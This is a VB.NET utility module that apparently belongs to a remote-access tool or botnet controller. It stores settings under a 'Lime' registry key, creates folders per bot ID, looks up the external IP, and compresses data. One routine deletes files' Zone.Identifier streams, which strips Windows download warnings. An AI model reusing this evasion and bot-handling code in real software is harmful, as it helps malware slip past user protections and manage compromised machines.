Imports System.IO
Imports Microsoft.Win32

Module S_Functions

    Function DLV(ByVal n As String) ' delete value in my Registry Key RG
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & "Lime").DeleteValue(n)
        Catch ex As Exception
        End Try
    End Function

    Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
        Try
            Return Registry.CurrentUser.CreateSubKey("Software\" & "Lime").GetValue(n, "")
        Catch ex As Exception
            Return Nothing
        End Try
    End Function

    Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & "Lime").SetValue(n, t)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

    Public Function getMD5Hash(ByVal B As Byte()) As String
        B = New Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(B)
        Dim str2 As String = ""
        Dim num As Byte
        For Each num In B
            str2 = (str2 & num.ToString("x2"))
        Next
        Return str2
    End Function


    Public Function siz(ByVal Size As String) As String
        If (Size.ToString.Length < 4) Then
            Return (CInt(Size) & " Bytes")
        End If
        Dim str As String = String.Empty
        Dim num As Double = CDbl(Size) / 1024
        If (num < 1024) Then
            str = " KB"
        Else
            num = (num / 1024)
            If (num < 1024) Then
                str = " MB"
            Else
                num = (num / 1024)
                str = " GB"
            End If
        End If
        Return (num.ToString(".0") & str)
    End Function

    Function SB(ByVal s As String) As Byte() ' string to byte()
        Return Text.Encoding.UTF8.GetBytes(s)
    End Function

    Function BS(ByVal b As Byte()) As String ' byte() to string
        Return Text.Encoding.UTF8.GetString(b)
    End Function

    Async Function fx(ByVal b As Byte(), ByVal Word As String) As Threading.Tasks.Task(Of Array)
        Dim a As New Collections.Generic.List(Of Byte())
        Dim M As New MemoryStream
        Dim MM As New MemoryStream
        Dim T As String() = Split(BS(b), Word)
        Await M.WriteAsync(b, 0, T(0).Length)
        Await MM.WriteAsync(b, T(0).Length + Word.Length, b.Length - (T(0).Length + Word.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function

    Function uFolder(ByVal BotID As String, ByVal file As String)
        If Not Directory.Exists("Users" + "\" + BotID.ToString) Then
            Directory.CreateDirectory("Users" + "\" + BotID.ToString)
        End If
        Return "Users" + "\" + BotID.ToString + "\" + file
    End Function

    Public Function GetExternalAddress() As String
        Try
            If S_Settings.IP = String.Empty Then
                Dim response As Net.WebResponse = Net.WebRequest.Create("http://checkip.dyndns.org/").GetResponse()
                Dim reader As New StreamReader(response.GetResponseStream())
                Dim Str As String = reader.ReadToEnd()
                reader.Dispose()
                response.Close()
                Dim startIndex As Integer = Str.IndexOf("Address: ") + 9
                Dim num2 As Integer = Str.LastIndexOf("</body>")
                S_Settings.IP = Str.Substring(startIndex, num2 - startIndex)
                Return S_Settings.IP
            Else
                Return S_Settings.IP
            End If
        Catch ex As Exception
            Return "127.0.0.1"
        End Try
    End Function


    Public rand As New Random()
    Public Function Randomi(ByVal lenght As Integer) As String
        Dim Chr As String = "顧家的程澤是顧商城的首席執行官顧太太希望她的生孫子顧金玉將接管顧成澤公司的使命引導合法的繼承人成為受人尊敬的商人"
        'Dim Chr As String = "asdfghjklqwertyuiopmnbvcxzQWERTYUIOPLKJHGFDSAZXCVBNM"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function

    Public Async Function GZip(ByVal B As Byte(), ByVal CM As Boolean) As Threading.Tasks.Task(Of Byte())
        Try
            If CM Then
                Dim buffer As Byte() = Nothing
                Using MS As New IO.MemoryStream
                    Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Compress, True)
                    Ziped.Write(B, 0, B.Length)
                    Ziped.Dispose()
                    MS.Position = 0
                    buffer = New Byte((CInt(MS.Length) + 1) - 1) {}
                    MS.Read(buffer, 0, buffer.Length)
                    MS.Dispose()
                End Using
                Return Buffer
            Else
                Dim array As Byte() = Nothing
                Using MS As New IO.MemoryStream(B)
                    Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Decompress)
                    Dim buffer As Byte() = New Byte(4 - 1) {}
                    MS.Position = (MS.Length - 5)
                    MS.Read(buffer, 0, 4)
                    Dim count As Integer = BitConverter.ToInt32(buffer, 0)
                    MS.Position = 0
                    array = New Byte(((count - 1) + 1) - 1) {}
                    Ziped.Read(array, 0, count)
                    Ziped.Dispose()
                    MS.Dispose()
                End Using
                Return array
            End If

        Catch ex As Exception
        End Try
    End Function

    <Runtime.InteropServices.DllImport("kernel32.dll", CharSet:=Runtime.InteropServices.CharSet.Auto, BestFitMapping:=False, ThrowOnUnmappableChar:=True, SetLastError:=True)>
    Function DeleteFile(<Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.LPTStr)> ByVal filepath As String
    ) As <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> Boolean
    End Function
    Sub DeleteZoneIdentifier(ByVal filePath As String)
        Try : DeleteFile(filePath + ":Zone.Identifier") : Catch : End Try
    End Sub

End Module
